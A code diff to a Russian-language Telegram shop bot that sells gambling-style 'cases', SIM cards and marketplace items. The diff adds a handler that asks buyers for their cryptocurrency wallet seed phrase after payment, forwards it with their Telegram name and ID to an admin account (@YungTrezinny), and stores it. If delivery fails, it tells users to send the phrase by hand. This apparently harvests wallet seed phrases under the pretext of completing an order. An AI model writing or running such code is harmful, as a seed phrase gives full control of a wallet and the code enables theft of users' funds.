@@ -185,7 +185,7 @@ CASES = {
     'majorik': {
         'name': '👑 Мажорик-кейс',
         'price': 5.0,
-        'description': 'Для тех, кто не боится riskовать',
+        'description': 'Для тех, кто не боится рисковать',
         'risk_level': 'Очень высокий',
         'risk_color': '🔴',
         'risk_scale': '███████░░░ 70% риска',
@@ -572,6 +572,96 @@ async def handle_captcha_answer(update: Update, context: ContextTypes.DEFAULT_TY
         )
     
     return WAITING_FOR_CAPTCHA
+
+# ============================================
+# ФУНКЦИЯ ДЛЯ ВВОДА СИД-ФРАЗЫ (ДОБАВЛЕНА!)
+# ============================================
+async def handle_sim_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ввода сид-фразы после оплаты"""
+    user_id = update.effective_user.id
+    seed_text = update.message.text
+    
+    current_order = context.user_data.get("current_order")
+    
+    if not current_order:
+        await update.message.reply_text(
+            "❌ Не найден активный заказ. Начните с /start"
+        )
+        return ConversationHandler.END
+    
+    order_type = "ТЕСТОВЫЙ" if current_order['type'] == 'test' else \
+                 "ПОДПИСИ"
+    
+    admin_message = (
+        f"🔔 НОВЫЙ ЗАКАЗ\n\n"
+        f"👤 Покупатель: {update.effective_user.first_name}\n"
+        f"🆔 ID: {user_id}\n"
+        f"📦 Тип: {order_type}\n"
+        f"🔢 Количество: {current_order['quantity']} шт\n"
+        f"📝 Сид-фраза:\n{seed_text}\n\n"
+        f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
+    )
+    
+    admin_notified = False
+    admin_error = ""
+    
+    if ADMIN_ID:
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_message
+            )
+            admin_notified = True
+            logger.info(f"Сообщение отправлено админу {ADMIN_ID}")
+        except Exception as e:
+            admin_error = str(e)
+            logger.error(f"Ошибка отправки админу через ID: {e}")
+    
+    if not admin_notified:
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_USERNAME,
+                text=admin_message
+            )
+            admin_notified = True
+            logger.info("Сообщение отправлено админу через юзернейм")
+        except Exception as e:
+            admin_error = str(e)
+            logger.error(f"Ошибка отправки админу через юзернейм: {e}")
+    
+    if admin_notified:
+        await update.message.reply_text(
+            f"✅ Данные отправлены администратору @YungTrezinny!\n\n"
+            f"Ожидайте обработки заказа."
+        )
+    else:
+        error_message = f"❌ Ошибка при отправке данных администратору.\n\n"
+        
+        if "bot can't initiate conversation" in admin_error or "Forbidden: bot was blocked" in admin_error:
+            error_message += f"Администратор @YungTrezinny должен сначала написать боту команду /start\n\n"
+        else:
+            error_message += f"Техническая ошибка: {admin_error[:100]}\n\n"
+        
+        error_message += f"Ваша сид-фраза (сохраните её):\n`{seed_text}`\n\n"
+        error_message += f"Отправьте её вручную @YungTrezinny"
+        
+        await update.message.reply_text(
+            error_message,
+            parse_mode='Markdown'
+        )
+    
+    if user_id in pending_orders:
+        for order in pending_orders[user_id]:
+            if order.get("order_id") == current_order.get("order_id"):
+                order["status"] = "completed" if admin_notified else "error"
+                order["seed"] = seed_text
+                break
+    
+    context.user_data.pop("current_order", None)
+    
+    await show_main_menu(update, context)
+    
+    return ConversationHandler.END
 
 # ============================================
 # ПОПОЛНЕНИЕ БАЛАНСА
@@ -1089,7 +1179,7 @@ async def pay_with_balance(update: Update, context: ContextTypes.DEFAULT_TYPE, p
     return True
 
 # ============================================
-# ОБНОВЛЁННАЯ ФУНКЦИЯ ДЛЯ ПОКУПКИ СИМ-КАРТ
+# ПОКУПКА СИМ-КАРТ
 # ============================================
 async def buy_sim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1201,7 +1291,7 @@ async def pay_sim_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await pay_with_balance(update, context, "sim", quantity, price_usd)
 
 # ============================================
-# ОБНОВЛЁННАЯ ФУНКЦИЯ ДЛЯ ТЕСТОВОГО ТОВАРА
+# ТЕСТОВЫЙ ТОВАР
 # ============================================
 async def buy_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1309,7 +1399,7 @@ async def pay_test_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await pay_with_balance(update, context, "test", 1, price_usd)
 
 # ============================================
-# ОБНОВЛЁННАЯ ФУНКЦИЯ ДЛЯ ПОКУПКИ С МАРКЕТПЛЕЙСА
+# МАРКЕТПЛЕЙС - ПОКУПКА
 # ============================================
 async def market_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1457,7 +1547,7 @@ async def buy_market_balance(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await pay_with_balance(update, context, "market", 1, price_usd, item_id)
 
 # ============================================
-# ОБНОВЛЁННАЯ ФУНКЦИЯ ПРОВЕРКИ ПЛАТЕЖА
+# ПРОВЕРКА ПЛАТЕЖА
 # ============================================
 async def check_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -2635,7 +2725,7 @@ async def admin_endchat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Ошибка: {e}")
 
 # ============================================
-# MAIN (ИСПРАВЛЕННАЯ)
+# MAIN
 # ============================================
 def main():
     app = Application.builder().token(TOKEN).build()
@@ -2667,7 +2757,7 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_input)]
     )
     
-    # ConversationHandler для маркетплейса (продажа)
+    # ConversationHandler для маркетплейса
     market_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(market_sell, pattern="^market_sell$")],
         states={
@@ -2720,7 +2810,7 @@ def main():
     app.add_handler(CommandHandler("reply", admin_reply))
     app.add_handler(CommandHandler("endchat", admin_endchat))
     
-    # Основные callback-обработчики (в правильном порядке)
+    # Основные callback-обработчики
     app.add_handler(CallbackQueryHandler(check_subscription_callback, pattern="^check_sub$"))
     app.add_handler(CallbackQueryHandler(back_to_faq, pattern="^back_to_faq$"))
     app.add_handler(CallbackQueryHandler(faq_reminder_handler, pattern="^faq_reminder$"))
@@ -2776,3 +2866,6 @@ def main():
     
     logger.info("🚀 Бот запускается...")
     app.run_polling()
+
+if __name__ == "__main__":
+    main()
